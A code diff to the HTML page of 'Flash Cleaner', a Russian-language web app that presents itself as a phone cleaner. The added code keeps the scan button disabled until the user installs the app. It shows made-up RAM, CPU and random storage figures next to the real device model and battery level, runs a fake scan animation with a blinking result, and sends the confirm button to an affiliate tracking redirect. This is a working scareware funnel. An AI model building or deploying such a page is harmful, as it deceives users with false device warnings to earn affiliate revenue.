@@ -6,12 +6,37 @@
   <title>Flash Cleaner</title>
   <link rel="manifest" href="manifest.json" />
   <link rel="stylesheet" href="style.css" />
-</head>
-<script>
+  <script>
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('service-worker.js');
     }
   </script>
+  <style>
+    #installPopup {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2e7d32;
+      color: white;
+      padding: 16px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      display: none;
+      z-index: 999;
+    }
+    #installPopup button {
+      margin-left: 12px;
+      background: white;
+      color: #2e7d32;
+      border: none;
+      padding: 8px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+</head>
 <body>
   <div class="container">
     <img src="icons/shield.svg" alt="Shield" class="icon" />
@@ -34,7 +59,8 @@
       </div>
     </div>
 
-    <button id="scanBtn">Начать сканирование</button>
+    <button id="installBtn" style="display:none;">Установить приложение</button>
+    <button id="scanBtn" disabled>Начать сканирование</button>
 
     <div id="scanner" style="display:none;">
       <p>Сканирование устройства...</p>
@@ -50,6 +76,100 @@
     </div>
   </div>
 
-  <script src="app.js"></script>
+  <div id="installPopup">
+    Добавьте Flash Cleaner на главный экран
+    <button id="popupInstall">Установить</button>
+  </div>
+
+  <script>
+    let deferredPrompt;
+
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+
+      const popup = document.getElementById('installPopup');
+      popup.style.display = 'flex';
+
+      document.getElementById('popupInstall').addEventListener('click', async () => {
+        popup.style.display = 'none';
+        await deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        if (outcome === 'accepted') {
+          document.getElementById('scanBtn').disabled = false;
+        }
+        deferredPrompt = null;
+      });
+    });
+
+    if (window.matchMedia('(display-mode: standalone)').matches) {
+      document.getElementById('scanBtn').disabled = false;
+      const popup = document.getElementById('installPopup');
+      popup.style.display = 'none';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const ram = navigator.deviceMemory || 4;
+      document.getElementById('ram').innerText = `${(ram * 0.65).toFixed(1)} GB / ${ram} GB`;
+
+      const cores = navigator.hardwareConcurrency || 4;
+      document.getElementById('cpu').innerText = `${Math.floor(cores * 12)}%`;
+
+      const freeStorage = Math.floor(Math.random() * 4 + 10);
+      document.getElementById('storage').innerText = `${freeStorage}.${Math.floor(Math.random() * 10)} GB свободно`;
+
+      const ua = navigator.userAgent;
+      const deviceInfo = document.createElement('p');
+      deviceInfo.style.fontSize = '0.8rem';
+      deviceInfo.style.marginTop = '1rem';
+      deviceInfo.style.color = '#aaa';
+
+      let model = 'Неизвестное устройство';
+      const match = ua.match(/\((.*?)\)/);
+      if (match && match[1]) {
+        const details = match[1].split(';');
+        model = details.length >= 3 ? details[2].trim() : details[0].trim();
+      }
+      deviceInfo.innerText = 'Модель устройства: ' + model;
+      document.querySelector('.container').appendChild(deviceInfo);
+
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          const level = Math.round(battery.level * 100);
+          const batteryStatus = document.createElement('p');
+          batteryStatus.style.fontSize = '0.9rem';
+          batteryStatus.style.color = '#ccc';
+          batteryStatus.innerHTML = `<span style="margin-right:6px;">🔋</span>Батарея: ${level}%`;
+          document.querySelector('.container').appendChild(batteryStatus);
+        });
+      }
+    });
+
+    document.getElementById('scanBtn').addEventListener('click', () => {
+      document.getElementById('scanBtn').style.display = 'none';
+      const scanner = document.getElementById('scanner');
+      const progress = document.getElementById('progress');
+      scanner.style.display = 'block';
+
+      let percent = 0;
+      const interval = setInterval(() => {
+        percent += 2;
+        progress.style.width = percent + '%';
+
+        if (percent >= 100) {
+          clearInterval(interval);
+          scanner.style.display = 'none';
+          const resultSection = document.getElementById('result');
+          const resultTitle = resultSection.querySelector('h2');
+          resultSection.style.display = 'block';
+          resultTitle.classList.add('blink');
+        }
+      }, 100);
+    });
+
+    document.getElementById('confirmBtn').addEventListener('click', () => {
+      window.location.href = 'https://redirect.scndprfttrck.click/click?o=10790&a=26&sub_id1={custom1}&aff_click_id={clickId}';
+    });
+  </script>
 </body>
 </html>
